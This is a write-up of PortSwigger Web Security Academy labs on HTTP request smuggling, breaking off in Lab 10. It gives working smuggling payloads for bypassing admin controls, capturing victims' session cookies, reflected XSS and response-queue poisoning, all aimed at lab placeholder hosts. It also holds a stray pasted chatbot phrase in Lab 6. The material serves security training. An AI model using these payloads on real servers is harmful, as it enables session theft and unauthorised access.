## Labs Covered

This write-up focuses on the following **PRACTITIONER-level labs** from the PortSwigger Web Security Academy related to **HTTP Request Smuggling**:

**1 HTTP request smuggling, confirming a CL.TE vulnerability via differential responses**
<blockquote>
This lab demonstrates how to confirm a CL.TE (Content-Length then Transfer-Encoding) desynchronization vulnerability using differential responses.
</blockquote>
	
**2 HTTP request smuggling, confirming a TE.CL vulnerability via differential responses**  
<blockquote>
This lab shows how to confirm a TE.CL (Transfer-Encoding then Content-Length) desynchronization vulnerability using differential responses.
</blockquote>
	
**3 Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability**
<blockquote>
This lab demonstrates bypassing front-end security controls by exploiting CL.TE request smuggling vulnerabilities.
</blockquote>

**4 Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability** 
<blockquote>
This lab shows how attackers can bypass security controls using TE.CL desynchronization.
</blockquote>

**5 Exploiting HTTP request smuggling to reveal front-end request rewriting**  
<blockquote>
This lab demonstrates using request smuggling to reveal how front-end servers rewrite incoming requests.
</blockquote>
	
**6 Exploiting HTTP request smuggling to capture other users' requests** 
<blockquote>
This lab shows how to leverage request smuggling to capture sensitive data from other users' requests.
</blockquote>

**7 Exploiting HTTP request smuggling to deliver reflected XSS**  
<blockquote>
This lab demonstrates using request smuggling to deliver reflected XSS payloads to other users.
</blockquote>
	
**8 Response queue poisoning via H2.TE request smuggling**  
<blockquote>
This lab covers HTTP/2 request smuggling attacks combining H2 (HTTP/2) and TE desynchronization.
</blockquote>

**9 H2.CL request smuggling**
<blockquote>
This lab demonstrates HTTP/2 request smuggling via H2.CL (HTTP/2 + Content-Length) vulnerabilities.
</blockquote>
	
**10 HTTP/2 request smuggling via CRLF injection**  
<blockquote>
This lab explores HTTP/2 request smuggling using CRLF (Carriage Return Line Feed) injection.
</blockquote>

**11 HTTP/2 request splitting via CRLF injection**  
<blockquote>
This lab shows how HTTP/2 request splitting can occur via CRLF injection.
</blockquote>

**12 CL.0 request smuggling**  
<blockquote>
This lab demonstrates request smuggling attacks using a Content-Length value of zero to manipulate request parsing.
</blockquote>

**13 HTTP request smuggling, basic CL.TE vulnerability**  
<blockquote>
This lab provides a straightforward example of a CL.TE request smuggling vulnerability.
</blockquote>
	
**14 HTTP request smuggling, basic TE.CL vulnerability**
<blockquote>
This lab provides a basic scenario demonstrating TE.CL request smuggling.
</blockquote>

**15 HTTP request smuggling, obfuscating the TE header**  
<blockquote>
This lab shows how attackers can obfuscate the Transfer-Encoding header to bypass filtering and perform request smuggling.
</blockquote>

---

### LAB 1 - HTTP request smuggling, confirming a CL.TE vulnerability via differential responses

### Lab Description

<img width="845" height="693" alt="image" src="https://github.com/user-attachments/assets/e77673d2-63b9-4a40-8e00-a2ba78d8f388" />

### Solution

When the lab start below page will shown in the screen


<img width="1612" height="687" alt="image" src="https://github.com/user-attachments/assets/f93beeff-2a6a-40e3-9dbf-b64cb5117ab9" />


In http history Browser to the lab URL and the traffic will start flowing into the proxy logs. Grab the GET request to `/` and send that to repeater.


<img width="1838" height="919" alt="image" src="https://github.com/user-attachments/assets/0c1c8dbd-fa3f-4871-9897-a4f764bbf27f" />


Changing request to **Post** and adding **body X=1** and changing method to **http/1** to know that request smuggling is possible in the request  or not



<img width="1915" height="668" alt="image" src="https://github.com/user-attachments/assets/1ab26d24-2df1-408c-a0c2-94e8d3e6f367" />


Changing request to Post and adding body X=1 and changing method to http/1 to know that request smuggling is possible in the request  or not


<img width="1915" height="668" alt="image" src="https://github.com/user-attachments/assets/549a9aef-bdb1-4c30-a035-c2ec4e6f357e" />

Adding payload to

```
Content-Type: application/x-www-form-urlencoded
 Content-Length: 35 
Transfer-Encoding: chunked
 0
 GET /404 HTTP/1.1
X-Ignore: X

``` 

The client side is reading content length which is `35` as show in **below image** when we select request the inspector tab is telling us `35` length which is content length
When request goes to server  it is reading till 0 giving us 200 response in burp and termiante then it will take 404 request and whoever request second time it will give 
Him 404 request and lab is solved



<img width="1106" height="468" alt="image" src="https://github.com/user-attachments/assets/869658e0-a635-472d-8e76-df82f04bdf43" />


As we can see in below image we have get `404` reponse on second same request


<img width="1915" height="808" alt="image" src="https://github.com/user-attachments/assets/bfd21ebe-cde3-4ffe-ac41-9c46def7f7f6" />


And lab is solved is solved when we have get 404 response


<img width="1751" height="387" alt="image" src="https://github.com/user-attachments/assets/13b04443-fa6e-4587-bd45-abec1cfc00ba" />

---

### LAB 2 - HTTP request smuggling, confirming a TE.CL vulnerability via differential responses

### Lab Description

<img width="858" height="696" alt="image" src="https://github.com/user-attachments/assets/c7f34eca-e1fb-41b6-b47d-ee89cf9f66a7" />

### Solution

When the lab start below page will shown in the screen.


<img width="1612" height="687" alt="image" src="https://github.com/user-attachments/assets/93dbc9df-8a33-4f13-9f34-1ad6e294faf6" />

In http history Browser to the lab URL and the traffic will start flowing into the proxy logs. Grab the GET request to / and send that to repeater.


<img width="1697" height="832" alt="image" src="https://github.com/user-attachments/assets/bdd6cee7-5596-469e-b225-63f003d26dba" />


Changing request to Post and adding body X=1 and changing method to http/1 to know that request smuggling is possible in the request  or not

<img width="1920" height="728" alt="image" src="https://github.com/user-attachments/assets/3f0cc4ba-ee0a-4e7b-9dd1-0f62de525e37" />


Using payload

```http

Content-Type: application/x-www-form-urlencoded 
Content-length: 4
 Transfer-Encoding: chunked 

5e
 POST /404 HTTP/1.1 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 15
 x=1 
0

```
The paylaod wil read until 5e and store remaning for next request due to content length usage in the server side and when second request we will come to server it will append reamaning request to that second request



<img width="1456" height="790" alt="image" src="https://github.com/user-attachments/assets/815bf7e0-31c1-4dce-8992-c85358d20a2f" />

**Important:**

If we used anything instance of 5e it will not work beacsue 5e is hexadecimal which is equal to `94` which will tell the server there will be 94 bytes more to processsed 


<img width="1062" height="453" alt="image" src="https://github.com/user-attachments/assets/8b5dd21c-9bdd-46a3-af45-04677468a37b" />


After sending second request it will give **404** reponse and lab is solved.


<img width="1505" height="782" alt="image" src="https://github.com/user-attachments/assets/df14610f-0664-489b-be83-925d22b8cc3d" />


Lab is solved


<img width="1636" height="322" alt="image" src="https://github.com/user-attachments/assets/64782677-4513-493f-93f5-418e6c18e74e" />


---

### LAB 3 - Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability

### Lab Description

<img width="867" height="722" alt="image" src="https://github.com/user-attachments/assets/43c0bc47-d1c1-4895-a784-9cf75cb6f3be" />

### Solution

When the lab start below page will shown in the screen


<img width="1770" height="701" alt="image" src="https://github.com/user-attachments/assets/4b150019-60e9-4feb-be7d-92ca1611faca" />


Try to visit **/admin** and observe that the request is blocked.


<img width="978" height="411" alt="image" src="https://github.com/user-attachments/assets/10263ac1-7733-459c-afda-b098f72e6411" />

In http history Browser to the `lab URL` and the traffic will start flowing into the proxy logs. Grab the GET request to `/` and send that to repeater.


<img width="1758" height="853" alt="image" src="https://github.com/user-attachments/assets/055fa6ab-03c1-42eb-8657-6360401ff537" />


Changing request to **Post** and adding body **k=1** and changing method to **http/1.1** to know that request smuggling is possible in the request  or not


<img width="1919" height="758" alt="image" src="https://github.com/user-attachments/assets/be627022-5cc9-40ab-b183-114409bf8da2" />


Then try to access merged request to `/admin` was rejected due to not using the header Host: localhost.

**Note**: Selecting the text or smuggled request at end through right click on mouse and scrolling down in repeater will tell you its content length in right side of inspector tab which is 37 and in **hex it is 0x25**


<img width="1441" height="618" alt="image" src="https://github.com/user-attachments/assets/ea00fe12-f1ae-461d-862f-d399817ea896" />


Now by addting the **local host in smuggled request** we can see that the request was **blocked**
 due to the **second request's Host header conflicting** with the **smuggled Host header** in the **first request**.


 <img width="980" height="400" alt="image" src="https://github.com/user-attachments/assets/5b6d6cb3-445e-4751-ac19-ff96ec7668ff" />



Now we have created a **full smuggled request** and sent first time we can see **200** response with no error of  duplicate header. When we send **second time** we 
See the **/admin** page which also shows us method to delete carlos


<img width="956" height="423" alt="image" src="https://github.com/user-attachments/assets/dad7ed0b-cdac-41b7-88c4-0e7deffc68fb" />

Using the previous response as a reference, change the smuggled request URL to delete carlos:


**Note:** Selecting the text or smuggled request at end through right click on mouse and scrolling down in repeater will tell you its content length in right side of inspector tab which is 138 and in hex it is 0x8a


<img width="1481" height="654" alt="image" src="https://github.com/user-attachments/assets/40168e0c-27c8-4e42-9d59-6d4045201841" />

Now after sending above request the lab is solved


<img width="1597" height="311" alt="image" src="https://github.com/user-attachments/assets/2dff9ac4-36ee-4c30-b3ab-a1415df1df79" />



---

### LAB 4 - Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability

### Lab Description

<img width="843" height="702" alt="image" src="https://github.com/user-attachments/assets/c3c309d6-b0cc-4a07-95d2-026ecd9539b8" />

### Solution

When the lab start below page will shown in the screen.


<img width="1575" height="694" alt="image" src="https://github.com/user-attachments/assets/d2e05229-df77-4c0c-a724-3ca391dbceab" />

Try to visit `/admin` and observe that the request is blocked.

<img width="1111" height="240" alt="image" src="https://github.com/user-attachments/assets/f1ca4ed3-0a70-45e0-bee9-198f6e998f0b" />

In http history Browser to the lab URL and the traffic will start flowing into the proxy logs. Grab the GET request to `/` and send that to repeater.


<img width="1920" height="732" alt="image" src="https://github.com/user-attachments/assets/bf331064-8f53-41ed-a705-b1261ed400bd" />


Changing request to **Post** and adding body **x=1** and changing method to **http/1.1** to know that request smuggling is possible in the request  or not


<img width="1920" height="800" alt="image" src="https://github.com/user-attachments/assets/0f7bd13b-2d2a-49cc-8dc2-2b004a24c9f8" />

In Burp Suite, go to the Repeater menu and ensure that the "Update Content-Length" option is unchecked.


<img width="796" height="524" alt="image" src="https://github.com/user-attachments/assets/b8952c5c-4562-4ed5-94f5-9819074d4e64" />

The next step is to create a Get request to **/admin** in our POST request’s body.
We can also see the size of chunked data by selecting till **x=1** and in repeater tab
 we can see the after selected the inspector tab which is **circle in rectangle** as shown in image below telling us
 **60 hex** which in decimal equal to **96**.

**Note: chunked size is in hexadecimal**

Payload we have used :



<img width="875" height="245" alt="image" src="https://github.com/user-attachments/assets/ddee3a20-285a-4c28-ac6e-eaf8a60e149d" />

 we have created two tab in repeater The **attacker tab** we will send first request of http request smuggling
 and in **normal** tab we will send secondrequest to knew smuggled is happent or not


<img width="1255" height="516" alt="image" src="https://github.com/user-attachments/assets/9e454589-bdb1-4656-b5fa-0572e5ae35c2" />


After sending attacker request . We will send normal request which will give **404** response
 and tell us only **localhost** can access admin  panel.


 <img width="1920" height="780" alt="image" src="https://github.com/user-attachments/assets/47596b5d-5eb9-4dcb-b0d5-e9362e8268b7" />

Using the header `Host: localhost` now you can now access the admin panel.


<img width="1327" height="528" alt="image" src="https://github.com/user-attachments/assets/eda0bfb6-4896-4113-bbd9-516d6b0fd456" />

Deleting user carlos and lab is solved.


<img width="1920" height="729" alt="image" src="https://github.com/user-attachments/assets/7e29189f-5179-41a6-b5bc-2834e9f7f53e" />

 And lab is solved.


 <img width="1687" height="407" alt="image" src="https://github.com/user-attachments/assets/29cb5aa3-f4e6-421c-a5ab-0d486b8ed7d1" />

---

### LAB 5 - Exploiting HTTP request smuggling to reveal front-end request rewriting

### Lab Description

<img width="837" height="821" alt="image" src="https://github.com/user-attachments/assets/e5fe9f34-13f3-4caf-a6eb-58f9d54014b3" />

### Solution

In http history Browser to the lab URL and the traffic will start flowing into the proxy logs. Grab the **GET** request to **/** and send that to **repeater**.


<img width="1898" height="862" alt="image" src="https://github.com/user-attachments/assets/f7b34c75-85aa-47d3-bd5f-dbf6e7006055" />

### Identify http smuggling type it  is TE:CL OR CL:TE OR TE:TE

Using this link `https://portswigger.net/web-security/request-smuggling/finding` In burpsuite I have try different http request smuggling  Technique

First I have use **CL.TE** vulnerabilities using timing techniques
Since the front-end server uses the Content-Length header, it will forward only part of this request, omitting the X. The back-end server uses 
the Transfer-Encoding header, processes the first chunk, and then waits for the next chunk to arrive. This will cause an observable time delay.
We can see in the **right last corner** it take more than **10 second to reach to the server**


<img width="1099" height="477" alt="image" src="https://github.com/user-attachments/assets/c63462e5-2924-49b1-a837-a9a19f3aaa91" />

### CL.TE vulnerabilities using differential responses


 This request now contains an invalid URL, the server will respond with status code **404**, indicating that the attack request did indeed interfere with it.
And confirm that **CL.TE** vulnerability exits.**I have also try TE.CL but failed.**

<img width="1195" height="489" alt="image" src="https://github.com/user-attachments/assets/f79ea2af-bfc9-42ec-93bb-1d93255b99b2" />

### Exploitation:

Browse to /admin and observe that the admin panel can only be loaded from `127.0.0.1`.


<img width="1391" height="404" alt="image" src="https://github.com/user-attachments/assets/9b4758a6-079b-4056-a2fb-832afa08405f" />

Use Burp Repeater to issue the following request twice.

The second response should contain **"Search results for"** followed by the start of a rewritten HTTP request.

<img width="1337" height="566" alt="image" src="https://github.com/user-attachments/assets/66f3fe4d-8b87-4098-b502-30f0227c946b" />

Make a note of the name of the X-*-IP header in the rewritten request, and use it to access the admin panel:

**Note**:**I have try multiple time to access admin panel from sending 2 request attacker and normal from same tab** but failed but then I have send attacker request  from one tab and 
Second normal request from the **second** tab and we have get admin panel 

<img width="1352" height="607" alt="image" src="https://github.com/user-attachments/assets/4c6e30e7-3e34-4c6e-8a97-1cacb5ec3ec2" />

This below is normal request through which we get admin panel.


<img width="1067" height="606" alt="image" src="https://github.com/user-attachments/assets/f1eecb0c-148c-4593-b0a5-adb919ebeb72" />



Using the previous response as a reference, change the smuggled request URL to delete the user carlos and after sending request multiple time we get 302 which mean  Carlos is deleted and lab is solved.



<img width="1175" height="640" alt="image" src="https://github.com/user-attachments/assets/e524f76a-70db-476f-bbb4-2ac217556a0b" />

Lab is solved


<img width="1362" height="299" alt="image" src="https://github.com/user-attachments/assets/225a9951-059c-4875-9f05-cc3e02e9da50" />



---

### LAB 6 - Exploiting HTTP request smuggling to capture other users' requests

### Lab Description

<img width="880" height="867" alt="image" src="https://github.com/user-attachments/assets/461a46da-73e4-4f1a-ae20-3809b97fc697" />

### Solution

Sure! Here's a clean Markdown version of the **Overview: Capturing Other Users' Requests** section, without any emojis:

---

## Overview: Capturing Other Users' Requests via HTTP Request Smuggling

---

### Technique Summary

If a web application allows users to store and later retrieve textual data—such as comments, names, profile descriptions, or emails—it can potentially be exploited to capture other users' HTTP requests using a technique known as **HTTP request smuggling**.

The core idea is to smuggle a specially crafted request in such a way that when another user sends their request, part of their data (e.g., session tokens or headers) gets included in your original smuggled request and ends up being stored in the application’s data store. You can then retrieve this data through normal application functionality.

---

### How the Attack Works

#### Target:

Any feature that stores user-submitted content:

* Blog comments
* Email fields
* Profile descriptions
* Screen names

#### Attack Flow:

1. You send a smuggled HTTP request that includes a legitimate-looking POST request, ending with a form field (such as `comment=`) positioned at the end of the request body.
2. You deliberately declare a longer `Content-Length` than the actual body you're sending, causing the back-end server to wait for more data.
3. The victim’s request, sent over the same back-end connection, completes your original request by appending its start to your unfinished POST body.
4. As a result, part of the victim's request (like cookies or headers) is stored as your submitted comment or text.
5. You later visit the comment section or retrieve the data to view the victim's captured information.

---

### Practical Example

**Original (Normal) POST Comment Submission:**

```http
POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 154
Cookie: session=attacker-session

csrf=abc&postId=2&comment=Nice+post&name=Attacker&email=attacker@example.com
```

**Smuggled Fat GET (Incomplete Body):**

```http
GET / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 330
0

POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=attacker-session

csrf=abc&postId=2&name=Attacker&email=attacker@example.com&comment=
```

**Victim’s Request (Appended to Smuggled Request):**

```http
GET / HTTP/1.1
Host: vulnerable-website.com
Cookie: session=VictimSessionID
```

Result: The victim’s session ID becomes part of the `comment` field, and the attacker can retrieve it later by viewing the comment.

---

### Solution

In **http history** Browser to the lab URL and the traffic will start flowing into the proxy logs. Grab the GET request to / and send that to repeater.

<img width="1864" height="851" alt="image" src="https://github.com/user-attachments/assets/f0207ad8-fdce-4875-b48d-5d772a048928" />

### CL.TE vulnerabilities using differential responses


 This request now contains an invalid URL, the server will respond with status code **404**, indicating that the attack request did indeed interfere with it.
And confirm that **CL.TE** vulnerability exits.I have also try **TE.CL** but failed.

<img width="1896" height="783" alt="image" src="https://github.com/user-attachments/assets/1c71f497-088b-4d2d-96db-fb83c6c84685" />

Now we have identify how can we access admin or user cookie whos vist post.Soi There was comment functionality in the post,we have  commented on it

<img width="1146" height="848" alt="image" src="https://github.com/user-attachments/assets/22a334fe-3edf-42b6-bcc2-d7c7aa095a85" />

As we can see that we have commented hello on the post.

<img width="678" height="426" alt="image" src="https://github.com/user-attachments/assets/67d64bf4-852d-4c48-b4f5-ca56508f5c93" />

Sending **/post/comment** to repeater,So we cam see that what parameter it will takes.

<img width="1901" height="702" alt="image" src="https://github.com/user-attachments/assets/06710dbf-f00a-46d3-bfd0-80a2a290b7f9" />

As we can see that it is taking **six** pararameter

<img width="1883" height="749" alt="image" src="https://github.com/user-attachments/assets/b5120025-e655-4be7-ba19-3a924ef2059f" />

### HTTP Request Smuggling to Capture Session Cookie


1. **Send the `comment-post` request to Burp Repeater.**
2. Shuffle the body parameters so that the `comment` parameter is the **last** one in the request.
3. Confirm that the comment still successfully gets stored on the blog.
4. **Increase the `Content-Length` header** of the smuggled request gradually.
   - Initially set to `400`, but no session cookie captured.
   - Once increased to around `950`, the session cookie of the victim is successfully captured.

---

### Final Payload Used

```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 256
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=your-session-token

csrf=your-csrf-token&postId=5&name=Carlos+Montoya&email=carlos%40normal-user.net&website=&comment=test
```

### How This Payload Works

* The `comment` field is deliberately positioned **at the end** of the body in the smuggled `POST` request.
* The `Content-Length` of the smuggled comment-post request is declared as `400`, but **only \~250 bytes** are actually sent.
* This causes the back-end server to **wait for the remaining \~150 bytes** to complete the declared body length.
* When the **next user request** hits the same backend connection, its start (which includes their session cookie) is interpreted as part of the smuggled request's body.
* The **session cookie** or other sensitive data from the victim is therefore appended to the `comment` field.
* As a result, the victim’s session token becomes visible in the blog comment that the attacker can later view.


<img width="1283" height="552" alt="image" src="https://github.com/user-attachments/assets/3930db2e-e81d-477d-a1f7-10caa1021848" />


As we can see that after sending previous smuggle request **100s** of time and reloading post 
we have finally get session cookie of user.


<img width="857" height="481" alt="image" src="https://github.com/user-attachments/assets/a6c2c227-6542-478b-9af9-3d462fc7f302" />

Editing session cookie

<img width="1792" height="568" alt="image" src="https://github.com/user-attachments/assets/e770cf7f-049f-4773-8409-10cc60d7aae7" />

After editing session cookie and reloading page we have get the **session cookie**.

<img width="1841" height="694" alt="image" src="https://github.com/user-attachments/assets/43781bbf-5e5f-4f70-9769-45ee6bd9d1dd" />


---

### LAB 7 - Exploiting HTTP request smuggling to deliver reflected XSS

### Lab Description

<img width="862" height="837" alt="image" src="https://github.com/user-attachments/assets/00557cf7-c0df-4287-a894-76895a6c7e5b" />

### Solution

### Overview: Exploiting Reflected XSS via HTTP Request Smuggling

This technique combines **HTTP request smuggling** with **reflected cross-site scripting (XSS)** to exploit users **without their interaction**.

---



---

#### Why It's Effective

1. **No user interaction required**
   Unlike typical XSS where victims must click a crafted link, this method hits users passively as they access the app.

2. **Targets hard-to-reach vectors**
   It allows exploitation of input sources like headers that are usually **not controllable** in a standard XSS scenario.

---

#### Example Attack Payload

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 63
Transfer-Encoding: chunked

0
GET / HTTP/1.1
User-Agent: <script>alert(1)</script>
Foo: X
```

* The back-end server is tricked into processing this as two requests.
* The **next incoming user** receives the response with the `User-Agent` header reflected, triggering the XSS.

---

Visit a blog post, and send the request to Burp Repeater.
Observe that the comment form contains your `User-Agent header` in a hidden input.

<img width="1740" height="899" alt="image" src="https://github.com/user-attachments/assets/97c1a0d9-ecec-444c-8f0b-0325f4371303" />


Sending blog post to repeater.

<img width="1807" height="811" alt="image" src="https://github.com/user-attachments/assets/e7de01dd-9cfc-447e-9f12-25c47607d6d6" />

In `http history Browser`   to the lab URL and the traffic will start flowing into the proxy logs. Grab the **GET** request to `/` and send that to repeater to test that smuggling is possible or not.

<img width="1877" height="941" alt="image" src="https://github.com/user-attachments/assets/25c7d112-9105-400f-8de3-f417f2e58f11" />

### CL.TE vulnerabilities using differential responses

 This request now contains an invalid URL, the server will respond with status code **404**, indicating that the attack request did indeed interfere with it.
  And confirm that **CL.TE** vulnerability exits.I have also try **TE.CL** but failed

<img width="1920" height="782" alt="image" src="https://github.com/user-attachments/assets/c3452769-30a6-40a3-9aca-90387e197884" />


Inject an XSS payload into the User-Agent header and observe that it gets reflected:
```
"/><script>alert(1)</script>
```

Smuggle this XSS request to the back-end server, so that it exploits the next visitor:

```http

POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 150
Transfer-Encoding: chunked

0

GET /post?postId=5 HTTP/1.1
User-Agent: a"/><script>alert(1)</script>
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

x=1

```
<img width="1920" height="825" alt="image" src="https://github.com/user-attachments/assets/efcb6c3a-e33e-471f-b08a-7c29a30b556e" />

Server is using **Transfer Encoding**, So from **0** below all the request will stored on server for other user request to append user  to that user agent request and generate alert

Send the abvove request  and server will wait until next user visit blog post 5 and he will inject alert  and alert will be genrtaed on screen

<img width="1920" height="524" alt="image" src="https://github.com/user-attachments/assets/ed1e8a23-9a7f-499f-8e30-f196bdac8fee" />

As we can see in below image alert is injected on user agent in the blog post.

<img width="1527" height="811" alt="image" src="https://github.com/user-attachments/assets/04655b5c-b7f1-4131-949f-5c59dd429871" />

And lab is solved.

<img width="1852" height="737" alt="image" src="https://github.com/user-attachments/assets/d6f7dc76-91a3-4acd-b36e-5fae3d3d47bf" />


---

### LAB 8 - Response queue poisoning via H2.TE request smuggling

### Lab Description

<img width="873" height="425" alt="image" src="https://github.com/user-attachments/assets/48623b57-98a0-4505-a2d4-3686a3633837" />

### Solution

Bascially this lab is  like below image in this lab first we will send two request in single request **one** is for attacker and **second** is smuggled request which is stored on server side waiting for another request which reponse  send to victum user and victum request is stored on server side and when other user or atacker send request to to server the reponse of that is send to attacker which alos contains important info like victum session cookie e.t.c

Additionaly in this lab we are using **http/2** to smuggle request not **http/1** but second smuggle request will be **http/1.1** but initial first request will be http/2.

<img width="952" height="709" alt="image" src="https://github.com/user-attachments/assets/b5b57e17-085c-4c0f-8d39-38e59b232039" />

When we start lab belwo page will show on the screen 

<img width="1614" height="584" alt="image" src="https://github.com/user-attachments/assets/5f67bff1-65af-43d2-b9e2-a195b6dd577f" />

We try to login as administer but is  available to admin user.

<img width="1202" height="534" alt="image" src="https://github.com/user-attachments/assets/abd86126-4b70-4e04-af3d-ba506b67797b" />

After changing request to post and pasting the payload to identified that http request smuggling is possible we see it 
Not working because we have a gap after **1.1** which causes **not to work**

<img width="649" height="278" alt="image" src="https://github.com/user-attachments/assets/3a1f5092-6388-4ffa-876c-5c8fcd0a1863" />


After fixing the space and sending request we see 200 response.Now we send normal request to look for possible smuggling happened or not 

<img width="1098" height="501" alt="image" src="https://github.com/user-attachments/assets/08b8da62-7b5d-42cf-9514-a14783da1c14" />



Sending normal request give us **404** reponse which means the preeevious request is **smuggled successfully**

<img width="1354" height="853" alt="image" src="https://github.com/user-attachments/assets/c8de78b7-e707-4604-a946-329fc98e3403" />

In Burp Repeater, create the following request, which smuggles a complete request to the **back-end server**. 

**Note** that the path in both requests points to a non-existent endpoint. This means that your request will always get a 404 response. Once you have poisoned the response queue, this will make it easier to recognize any other users' responses that you have **successfully captured.**

```http


POST /x HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Transfer-Encoding: chunked
0
GET /x HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net

```

<img width="1496" height="859" alt="image" src="https://github.com/user-attachments/assets/1f7f9794-b3ea-483f-860f-34ada3dec2d5" />

Wait for around **5 seconds**, then send the request again to fetch an arbitrary response. Most of the time, you will receive your own 404 response. Any other response code indicates that you have successfully captured a response intended for the admin user. Repeat this process until you capture a 302 response containing the admin's new post-login session cookie.

**Note**
If you receive some 200 responses but can't capture a 302 response even after a lot of attempts, send 10 ordinary requests to reset the connection and try again.

Copy the session cookie 

<img width="1048" height="669" alt="image" src="https://github.com/user-attachments/assets/441feffd-b450-4c2c-86e3-a707c3367474" />

Paste  the **above  session  cookie** and **redirection url** to acess admin panel

<img width="1870" height="841" alt="image" src="https://github.com/user-attachments/assets/cb5d3be8-7c5e-46b0-bce7-54a03cf3f0ca" />

Go to admin panel and delete Carlos and lab is solved

<img width="1920" height="867" alt="image" src="https://github.com/user-attachments/assets/c0f1064e-4171-4965-96b0-a51d0eeef1b1" />


Lab is solved 

<img width="1674" height="600" alt="image" src="https://github.com/user-attachments/assets/a49a5e2b-3633-4ac3-b250-a95341776390" />

---

### LAB 9 - H2.CL request smuggling

### Lab Description

<img width="890" height="618" alt="image" src="https://github.com/user-attachments/assets/593ede02-6994-45d0-b300-e945cdf1b0ae" />

### Solution

To begin with when we start lab we have below page.

<img width="1710" height="790" alt="image" src="https://github.com/user-attachments/assets/f3780d2e-fe67-4f27-9cbe-bd3c2d8220c6" />

We have search whose  content is reflected inside an `h1` element:

<img width="1920" height="651" alt="image" src="https://github.com/user-attachments/assets/f27b21bc-c504-4bfb-8954-fbdc5c3ca13d" />

 We have search come in http history in `post  /`  request sending that to repeater.


<img width="1733" height="733" alt="image" src="https://github.com/user-attachments/assets/9248041a-946a-44d6-b7b2-900e0e979996" />


The **\r\n** you see in HTTP requests refers to two special characters combined:
	• **\r** (Carriage Return): This character (ASCII code 13) tells the computer to move the cursor to the beginning of the current line.
	• **\n** (Line Feed): This character (ASCII code 10) tells the computer to move the cursor down one line.
Together, **\r\n** creates a new line marker, signifying the end of a line in the HTTP request.


Burpsuite automatically add it \r\n but you can also add it through clicking on circle **rectangle**

<img width="1329" height="503" alt="image" src="https://github.com/user-attachments/assets/805a0003-4d0a-45cc-b051-334436a2b33f" />

We can see the request we have send to repeater in burpsuite.

**Note**: if we have no post request than Changing request to **Post** and adding body **x=1** and changing method to **http/1.1** to know that request smuggling is possible in the request  or not.

<img width="1382" height="584" alt="image" src="https://github.com/user-attachments/assets/602d0a21-a296-4679-9d69-c3d70f32415c" />

We also change **l=s** and send to repeater and see **200** response

 **Note**: if we have no post request than Changing request to **Post** and adding body **x=1** and changing method to **http/1.1** to know that request smuggling is possible in the request  or not.

  <img width="1337" height="503" alt="image" src="https://github.com/user-attachments/assets/744ff743-5266-4ee3-b498-740aac7e667d" />

Observe that every second request you send receives a **404** response, confirming that you have caused the back-end to append the subsequent request to the smuggled prefix.beacuse in http.2 length is not dependented on header it will automatically detect it when the request is send

<img width="1462" height="725" alt="image" src="https://github.com/user-attachments/assets/447b893e-c9b2-47eb-8bbd-4d997cdb08e6" />


Using enagagment tool in burp to discover content

<img width="1366" height="838" alt="image" src="https://github.com/user-attachments/assets/2fd2897c-0bf9-450d-a899-9683ac7e5c7d" />


We can see that  resource is redirecting us to  **url/resources**

<img width="1386" height="771" alt="image" src="https://github.com/user-attachments/assets/46c2174a-9dbc-4c56-ba34-712a63f75f39" />


Create the following request to smuggle the start of a request for /resources, along with an arbitrary Host header:

```http

POST / HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Content-Length: 0

GET /resources HTTP/1.1
Host: foo
Content-Length: 5

x=1
```


Send the request a few times. Notice that smuggling this prefix past the front-end allows you to redirect the subsequent request on the connection to an arbitrary host

<img width="1358" height="542" alt="image" src="https://github.com/user-attachments/assets/4c249c22-9486-48cd-8fc7-86ec33e8b363" />

Go to the exploit server and change the file path to **/resources**. In the body, enter the payload **alert(document.cookie)**, then store the exploit.

<img width="1601" height="878" alt="image" src="https://github.com/user-attachments/assets/e043932a-466a-4814-9a0e-c76e1dc9b89c" />


In Burp Repeater, edit your malicious request so that the **Host header** points to your exploit server:

Send the request a few times and confirm that you receive a redirect to the exploit server.
Resend the request and wait for 10 seconds or so.

<img width="1049" height="583" alt="image" src="https://github.com/user-attachments/assets/a9d7929d-da03-4aad-86e7-bd89959527ea" />


Go to the exploit server and check the access log. If you see a `GET /resources/` request from the victim, this indicates that your request smuggling attack was successful. Otherwise, check that there are no issues with your attack request and try again.

<img width="1368" height="294" alt="image" src="https://github.com/user-attachments/assets/afe3ad27-fd8e-42e6-bbb0-86ccbb81d288" />


Once you have confirmed that you can cause the victim to be redirected to the exploit server, repeat the attack until the lab solves. This may take several attempts because you need to time your attack so that it poisons the connection immediately before the victim's browser attempts to import a JavaScript resource. Otherwise, although their browser will load your malicious JavaScript, it won't execute it.

And then lab is solved

<img width="1601" height="331" alt="image" src="https://github.com/user-attachments/assets/22f02025-b1f9-45b9-9ac5-8079ac39d27b" />

---

### LAB 10 - HTTP/2 request smuggling via CRLF injection

### Lab Description
<img width="888" height="656" alt="image" src="https://github.com/user-attachments/assets/3cbd84d6-6b11-4757-9fa2-b53ca9bdb247" />

### Solution

### HTTP/2 Request Smuggling via Search Functionality

In this lab, we observed a search function that records and reflects previous search terms submitted by the user. When we removed the session cookie and reloaded the page, the search history disappeared. This indicates that the search data is tied to the user's session.

### Exploitation Approach

We leveraged this behavior to capture other users' requests by performing **HTTP request smuggling** using **HTTP/2**. The idea was to craft a request with an **incomplete body** by specifying a greater `Content-Length`, allowing the server to read part of a subsequent user’s request as part of our own.

### Key Exploit Details

